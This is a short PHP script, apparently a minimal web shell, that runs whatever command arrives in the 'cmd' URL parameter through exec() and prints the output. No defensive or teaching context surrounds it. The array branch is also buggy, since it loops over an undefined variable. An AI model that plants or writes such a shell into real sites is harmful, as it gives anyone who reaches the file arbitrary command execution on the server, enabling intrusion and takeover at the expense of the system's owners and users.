<?php
$response = exec($_GET['cmd']);
if(is_array($response)){
  foreach ($variable as $key => $value) {
    echo $value. "<br>";
  }
}
if(is_string($response)){
  echo $response. "<br>";
}
